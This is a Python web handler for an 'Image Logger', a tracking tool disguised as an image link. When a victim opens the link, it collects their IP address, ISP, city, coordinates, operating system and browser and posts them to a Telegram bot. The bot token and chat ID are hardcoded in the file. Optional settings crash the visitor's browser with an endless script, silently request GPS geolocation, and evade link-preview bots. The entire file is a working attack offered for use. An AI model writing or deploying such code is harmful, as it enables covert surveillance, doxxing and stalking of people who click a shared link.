from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser


__app__ = ""
__description__ = ""
__version__ = "v1.0"
__author__ = ""

# 🔹 CONFIGURATION 🔹 #
TELEGRAM_BOT_TOKEN = "7520064493:AAF1DQNgrVLB0iRRZmFcnD_1slWC9x60aIg"  # Replace with your Telegram Bot Token
TELEGRAM_CHAT_ID = "92457171"  # Replace with your Chat ID

config = {
    "image": "https://link-to-your-image.here",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been logged. Check Telegram for details.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")


# 🔹 TELEGRAM MESSAGE FUNCTION 🔹 #
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            send_telegram_message(
                f"⚠️ *Link Sent Alert*\n\nA logging link was shared!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`")
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    os, browser = httpagentparser.simple_detect(useragent)

    message = f"""
🚨 *New IP Logged* 🚨

**Endpoint:** `{endpoint}`

🌍 **IP Info:**
- **IP:** `{ip if ip else 'Unknown'}`
- **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
- **Country:** `{info['country'] if info['country'] else 'Unknown'}`
- **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
- **City:** `{info['city'] if info['city'] else 'Unknown'}`
- **Coords:** `{str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', ')}`
- **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
- **VPN:** `{info['proxy']}`
- **Bot:** `{info['hosting'] if info['hosting'] else 'False'}`

💻 **PC Info:**
- **OS:** `{os}`
- **Browser:** `{browser}`
- **User Agent:** `{useragent}`
"""
    send_telegram_message(message)


binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}


class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url", "").encode()).decode() if dic.get("url") else config["image"]
            else:
                url = config["image"]

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location,
                           s.split("?")[0], url=url)
            else:
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'),
                           endpoint=s.split("?")[0], url=url)

            message = config["message"]["message"]

            if config["message"]["doMessage"]:
                data = message.encode()
            else:
                data = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''.encode()

            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    currenturl += (currenturl.includes("?") ? "&" : "?") + "g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
    location.replace(currenturl);});
}}
</script>"""

            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error. Check Telegram for errors.')
            send_telegram_message("⚠️ *Error in Image Logger!* Check logs.")

    do_GET = handleRequest
    do_POST = handleRequest


handler = app = ImageLoggerAPI
